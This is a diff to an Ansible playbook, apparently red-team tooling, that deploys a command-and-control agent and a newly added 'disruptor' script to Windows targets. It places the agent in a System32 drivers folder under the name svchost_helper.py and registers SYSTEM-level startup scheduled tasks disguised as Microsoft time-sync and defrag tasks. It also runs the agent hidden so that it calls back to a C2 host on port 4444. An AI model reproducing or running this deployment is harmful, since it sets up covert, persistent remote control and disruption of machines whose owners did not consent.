@@ -1,22 +1,22 @@
 ---
-# deploy_c2service.yml
-
+# deploy.yml
+# Deploys C2 agent and disruptor to Windows targets
 
 - name: Deploy C2 agent to Windows targets
   hosts: windows
   vars:
-    # Where the agent lands on the target
     deploy_dir: "C:\\Windows\\System32\\drivers\\etc\\sync\\"
     agent_script: "{{ deploy_dir }}svchost_helper.py"
+    disruptor_script: "{{ deploy_dir }}disruptor.py"
 
-    # Local path to agent on your Kali jumpbox
     local_agent: "./c2/c2agent.py"
-    # Your Kali red team IP and C2 server port
-    c2_host: "10.100.1.144"
+    local_disruptor: "./c2/disruptor.py"
 
+    c2_host: "10.100.1.144"
     c2_port: "4444"
 
-    task_name: "MicrosoftWindowsTimeSyncTask"
+    agent_task: "MicrosoftWindowsTimeSyncTask"
+    disruptor_task: "MicrosoftWindowsDefragTask"
 
   tasks:
 
@@ -30,19 +30,33 @@
         src: "{{ local_agent }}"
         dest: "{{ agent_script }}"
 
-    - name: Remove old scheduled task if exists
+    - name: Copy disruptor to target
+      ansible.windows.win_copy:
+        src: "{{ local_disruptor }}"
+        dest: "{{ disruptor_script }}"
+
+    - name: Remove old agent task if exists
       ansible.windows.win_shell: |
-        schtasks /Delete /TN "{{ task_name }}" /F
+        schtasks /Delete /TN "{{ agent_task }}" /F
       ignore_errors: true
 
     - name: Create scheduled task to run agent on startup
       ansible.windows.win_shell: |
-        schtasks /Create /TN "{{ task_name }}" /TR "python {{ agent_script }} {{ c2_host }} {{ c2_port }} {{ agent_id }}" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
+        schtasks /Create /TN "{{ agent_task }}" /TR "python {{ agent_script }} {{ c2_host }} {{ c2_port }} {{ agent_id }}" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
 
     - name: Run the agent now without waiting for reboot
       ansible.windows.win_shell: |
         Start-Process python -ArgumentList "{{ agent_script }} {{ c2_host }} {{ c2_port }} {{ agent_id }}" -WindowStyle Hidden
       ignore_errors: true
+
+    - name: Remove old disruptor task if exists
+      ansible.windows.win_shell: |
+        schtasks /Delete /TN "{{ disruptor_task }}" /F
+      ignore_errors: true
+
+    - name: Create disruptor scheduled task
+      ansible.windows.win_shell: |
+        schtasks /Create /TN "{{ disruptor_task }}" /TR "python {{ disruptor_script }}" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
 
     - name: Confirm agent file is in place
       ansible.windows.win_stat:
